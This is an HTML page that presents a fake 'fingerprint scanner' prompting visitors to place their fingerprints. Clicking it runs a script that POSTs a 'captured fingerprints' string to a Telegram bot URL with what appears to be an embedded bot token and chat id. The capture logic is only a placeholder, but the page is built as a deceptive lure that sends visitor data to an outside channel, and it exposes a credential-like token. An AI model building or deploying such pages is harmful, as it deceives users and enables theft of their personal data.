<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: black;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        #fingerprint-scanner {
            width: 200px;
            height: 200px;
            background-color: darkgray;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }
    </style>
    <script>
        function sendFingerprint() {
            // Logic to capture and send fingerprints to your Telegram bot
            var fingerprints = "Captured fingerprints data";
            var xhttp = new XMLHttpRequest();
            xhttp.open("POST", "https://api.telegram.org/botAAEpBdRg0Z6lmQoUJ1KcnBasyrxT5GBu0xs/sendMessage?chat_id=5697561499&text=" + fingerprints, true);
            xhttp.send();
            alert("Fingerprints sent to your Telegram bot!");
        }
    </script>
</head>
<body>
    <div id="fingerprint-scanner" onclick="sendFingerprint()">
        <p>Place your fingerprints here</p>
    </div>
</body>
</html>
